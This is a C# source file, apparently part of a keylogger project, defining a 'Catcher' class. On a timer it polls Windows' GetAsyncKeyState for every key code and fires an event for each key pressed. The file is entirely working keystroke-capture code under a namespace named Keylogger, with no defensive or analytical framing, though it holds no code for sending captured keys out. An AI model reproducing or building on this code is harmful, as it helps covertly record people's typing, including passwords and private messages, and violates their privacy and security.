using System;
using System.Timers;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Keylogger
{
    class Catcher
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int key);

        [DllImport("user32.dll")]
        public static extern int ToUnicode(
            uint virtualKeyCode,
            uint scanCode,
            byte[] keyboardState,
            StringBuilder receivingBuffer,
            int bufferSize,
            uint flags);


        System.Timers.Timer timer;
        int delay;
        public int Delay { get => delay; set => ChangeDelay(value); }
        public bool IsActive { get => timer.Enabled; }

        public delegate void KeyHandler(Keys key);
        public event KeyHandler KeyPressed;
        public Catcher(int delay)
        {
            timer = new System.Timers.Timer(delay);
            Delay = delay;
            timer.Elapsed += CheckKeys;
        }
        public void Start()
        {
            timer.Start();
        }
        public void Stop()
        {
            timer.Stop();
        }
        void ChangeDelay(int delay)
        {
            this.delay = delay;
            timer.Interval = delay;
        }
        public void CheckKeys(Object source, ElapsedEventArgs e)
        {
            for (int i = 0; i < 255; i++)
            {
                int responce = GetAsyncKeyState(i);
                if (responce == 32769)
                {
                    Keys key = (Keys)i;

                    KeyPressed(key);
                }
            }
        }
    }
}
